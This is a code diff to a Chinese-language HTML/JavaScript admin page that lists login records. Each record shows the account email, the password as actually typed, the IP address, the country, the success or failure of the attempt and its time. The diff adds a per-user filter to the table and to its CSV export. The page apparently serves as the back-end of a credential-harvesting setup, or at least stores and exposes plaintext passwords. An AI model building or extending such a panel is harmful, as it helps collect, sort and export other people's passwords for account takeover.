@@ -29,7 +29,12 @@ tr:hover td{background:#f4fcf7}
 <body>
 <div class="container">
   <div class="head"><h1>用户登录日志</h1><div class="sub" id="logUser"></div></div>
-  <div class="toolbar"><button class="btn" onclick="exportCsv()">导出 Excel(CSV)</button></div>
+  <div class="toolbar">
+    <select id="userFilter" onchange="render()" style="padding:9px 14px;border-radius:99px;border:1px solid #b8e0ca;background:#fff;color:#2a6b4e;font-size:14px;margin-right:8px">
+      <option value="">全部用户</option>
+    </select>
+    <button class="btn" onclick="exportCsv()">导出 Excel(CSV)</button>
+  </div>
   <div class="table-wrap"><table>
     <thead><tr><th>登录账号邮箱</th><th>输入密码</th><th>登录IP</th><th>国家/地区</th><th>登录结果</th><th>登录时间</th></tr></thead>
     <tbody id="logBody"><tr><td colspan="6" class="empty">正在加载...</td></tr></tbody>
@@ -54,22 +59,33 @@ async function loadLogs(){
   const res = await fetch('/api/login-logs',{headers:{Authorization:'Bearer '+token}});
   if(!res.ok){ document.getElementById('logBody').innerHTML='<tr><td colspan="6" class="empty">读取失败</td></tr>'; return; }
   logs = await res.json();
+  buildFilter();
   render();
 }
 function render(){
   const body = document.getElementById('logBody');
-  if(!logs.length){ body.innerHTML='<tr><td colspan="6" class="empty">暂无登录记录</td></tr>'; return; }
-  body.innerHTML = logs.map(r=>`
+  const filter = document.getElementById('userFilter').value;
+  const list = filter ? logs.filter(r=>r.email===filter) : logs;
+  if(!list.length){ body.innerHTML='<tr><td colspan="6" class="empty">暂无登录记录</td></tr>'; return; }
+  body.innerHTML = list.map(r=>`
     <tr>
       <td>${esc(r.email)}</td><td>${esc(r.input_pwd||'')}</td><td>${esc(r.ip||'')}</td><td>${esc(r.area||'')}</td>
       <td class="${r.status==='success'?'ok':'fail'}">${r.status==='success'?'登录成功':'登录失败'}</td>
       <td>${new Date(r.created_at).toLocaleString('zh-CN',{hour12:false})}</td>
     </tr>`).join('');
 }
+function buildFilter(){
+  const sel = document.getElementById('userFilter');
+  const emails = [...new Set(logs.map(r=>r.email).filter(Boolean))].sort();
+  sel.innerHTML = '<option value="">全部用户</option>' + emails.map(e=>`<option value="${esc(e)}">${esc(e)}</option>`).join('');
+}
 function exportCsv(){
   if(!logs.length){ alert('暂无数据可导出'); return; }
+  const filter = document.getElementById('userFilter').value;
+  const list = filter ? logs.filter(r=>r.email===filter) : logs;
+  if(!list.length){ alert('当前筛选下暂无数据可导出'); return; }
   const head='登录账号邮箱,输入密码,登录IP地址,国家/地区,登录结果,登录时间';
-  const rows=logs.map(r=>[r.email,r.input_pwd||'',r.ip||'',r.area||'',r.status==='success'?'登录成功':'登录失败',new Date(r.created_at).toLocaleString('zh-CN',{hour12:false})].map(esc).join(','));
+  const rows=list.map(r=>[r.email,r.input_pwd||'',r.ip||'',r.area||'',r.status==='success'?'登录成功':'登录失败',new Date(r.created_at).toLocaleString('zh-CN',{hour12:false})].map(esc).join(','));
   const blob=new Blob(['\uFEFF'+[head,...rows].join('\r\n')],{type:'text/csv;charset=utf-8;'});
   const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
   a.download='登录日志_'+new Date().toISOString().slice(0,10)+'.csv'; a.click();
